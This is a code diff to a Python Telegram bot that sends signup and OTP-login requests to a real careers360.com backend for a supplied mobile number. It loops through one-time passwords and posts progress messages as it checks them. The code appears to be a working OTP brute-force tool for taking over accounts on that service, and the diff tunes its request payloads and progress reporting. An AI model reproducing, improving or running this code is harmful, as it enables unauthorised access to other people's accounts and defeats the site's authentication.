@@ -65,14 +65,24 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Signup
     signup_url = "https://backend-cus.careers360.com/api/1/cus/signup"
     signup_data = {
-        "current_url": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram",
-        "destination": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram",
-        "cta_clicked": "signup",
-        "country_code": "+91",
-        "mobile_number": mobile_number,
-        "email": ask_email,
-        "name": ask_name,
-        "submit": True
+            "current_url": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5?destination=https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
+            "destination": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
+            "cta_clicked": "signup",
+            "country_code": "+91",
+            "mobile_number": mobile_number,
+            "location": 64,
+            "current_location": "",
+            "email": ask_email,
+            "education_level": 12,
+            "name": ask_name,
+            "submit": True,
+            "interested_in": [],
+            "checkbox_id": 0,
+            "checkbox_status": False,
+            "passing_year": 2025,
+            "degree_interested": 2,
+            "domain_id": 1,
+            "certification": False
     }
 
     signup_response = requests.post(signup_url, json=signup_data, headers=HEADERS)
@@ -98,13 +108,15 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return None
 
         login_data = {
-            "current_url": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram",
-            "destination": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram",
-            "otp_on": "mobile",
-            "country_code": "+91",
-            "mobile_number": mobile_number,
-            "otp": otp,
-            "user_uuid": user_uuid
+                "current_url": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5?destination=https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
+                "destination": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
+                "certification": False,
+                "cta_clicked": "signup",
+                "otp_on": "mobile",
+                "country_code": "+91",
+                "mobile_number": mobile_number,
+                "otp": otp,
+                "user_uuid": user_uuid
         }
 
         login_response = requests.post(login_url, json=login_data, headers=HEADERS)
@@ -128,7 +140,7 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     break
 
                 # Edit the message every 500 OTPs checked
-                if checked_otps % 500 == 0:
+                if checked_otps % 200 == 0:
                     await progress_message.edit_text(f"🔄 Checking OTPs... ({checked_otps} checked)")
 
     await check_otp_with_updates()
